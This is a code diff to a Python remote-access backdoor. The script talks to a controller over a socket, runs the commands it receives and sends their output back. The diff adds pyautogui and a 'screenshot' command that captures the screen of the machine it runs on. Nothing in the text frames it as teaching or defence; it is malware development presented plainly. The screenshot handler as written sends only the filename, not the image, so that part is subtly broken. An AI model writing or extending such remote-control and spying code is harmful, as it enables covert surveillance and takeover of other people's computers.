@@ -2,6 +2,7 @@ import socket
 import os
 import sys
 import subprocess
+import pyautogui
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
@@ -16,3 +17,9 @@ while True:
         if not output or output == '':
             output = 'Command executed'
         s.send(output.encode())
+    
+    elif cmd == 'screenshot':
+        screenshot = pyautogui.screenshot()
+        screenshot.save('screenshot.png')
+        s.send('screenshot.png'.encode())
+        os.remove('screenshot.png')
